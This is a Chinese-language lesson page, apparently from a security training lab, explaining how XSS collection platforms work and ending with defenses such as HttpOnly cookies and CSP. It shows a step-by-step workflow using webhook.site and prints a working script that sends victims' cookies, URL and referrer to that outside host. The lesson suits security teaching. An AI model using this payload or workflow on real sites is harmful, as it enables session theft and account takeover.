XSS 平台是做什么的

XSS 平台的核心是「托管 payload + 集中收信」：攻击者把恶意脚本放到平台，把链接投递给受害者；受害者浏览器执行脚本后，把 cookie、页面内容、按键等数据回传到平台后台，攻击者再统一查看与管理。

  • 收信：提供稳定的回调地址，记录受害者的 cookie、UA、来源页面、时间与 IP。
  • 托管 payload：平台保存脚本并生成短链接，避免在目标站点留下明显痕迹，也便于反复投递。
  • 绕过长度限制：注入点可写入字符很少时，只写一个外链 <script src="//平台/xxx"></script>，真正逻辑放在平台。
  • 窃取 Cookie / 会话：读取 document.cookie 并回传，配合会话固定或自动登录维持权限。
  • 键盘记录：监控输入框与表单提交，获取账号、密码、验证码等。
  • 维持会话与批量管理：受害者上线状态、命令下发、页面跳转、批量受害者列表。

常见平台类型与差别

类型特点适用场景
公开在线平台免部署、开箱即用，通常提供短链接与基础收信；但数据在第三方、可能被拦截或限流。授权测试、快速验证反射/存储型 XSS。

以 webhook.site 为例的真实流程

本关以公开收信平台 webhook.site 为例，演示平台在 XSS 利用里的四个动作：生成收信地址 → 托管/注入 payload → 受害者回连 → 面板查看命中记录。

  1. 生成收信地址：打开 webhook.site，页面自动分配唯一 URL（形如 https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx），无需注册即可实时收信；注册后可长期保存地址。
  2. 托管 / 注入 payload：把地址填进脚本，二选一投放：直接注入目标站点的反射 / 存储 / DOM 注入点；或把脚本保存为 HTML 文件托管到可访问地址，再诱导受害者打开。
  3. 受害者回连：受害者浏览器执行脚本，向 webhook.site 发起一次 GET 请求，cookie、页面地址、来源页随查询参数带出。
  4. 面板查看记录：webhook.site 左侧 Requests 列表实时显示每一次命中，点开即可看到完整请求。
<script>
new Image().src = 'https://webhook.site/你的唯一地址'
  + '?c=' + encodeURIComponent(document.cookie)
  + '&u=' + encodeURIComponent(location.href)
  + '&r=' + encodeURIComponent(document.referrer);
</script>

webhook.site 面板里实际能拿到的信息：

面板字段说明
Query String查询参数 c 解码后就是 document.cookie（被窃取的会话凭证）；u 为触发页面地址，r 为来源页。
Source IP命中请求的来源 IP。浏览器场景下是受害者出口 IP；盲打场景下是服务器出口 IP。
User-Agent受害者浏览器、操作系统与内核版本，可判断真实用户与设备类型。
Referer触发脚本的页面地址；受浏览器隐私策略或 Referrer-Policy 影响，可能为空。
Headers完整请求头，含 Accept、Accept-Language 等。注意 webhook.site 自己域下的 Cookie 头通常为空，被窃 cookie 在查询参数 c 里。
Created命中时间，可用于判断存储型 / Blind XSS 的触发延迟。

靶场内可用的替代方案（自建收信）

  1. 平台生成一个随机收信地址（本关用 token 区分每次演练）。
  2. 把 payload 托管到平台，得到可直接访问的托管地址。
  3. 模拟受害者打开托管地址，浏览器执行脚本并向收信地址回连。
  4. 平台后台展示收信记录，攻击者从中提取 cookie 或目标数据。

本关的「收信地址」与「托管地址」都由 modules/xss/platform.php 与 uploads/xss/platform/ 模拟，不连接任何真实第三方平台；它保留了自动判定通关的能力，适合离线课堂使用。

防御视角

  • 输出编码：按上下文（HTML / 属性 / JS / URL）做转义，从源头阻止脚本执行。
  • 输入过滤与富文本白名单：允许有限标签，过滤 script、事件属性与 javascript:。
  • HttpOnly Cookie：会话 cookie 设为 HttpOnly，即使存在 XSS 也读不到会话凭证。
  • CSP：Content-Security-Policy 限制脚本来源，禁止内联脚本与未知域外链。
  • 独立域名托管用户内容：上传文件放到不同源，配合 Content-Disposition: attachment 与 nosniff。
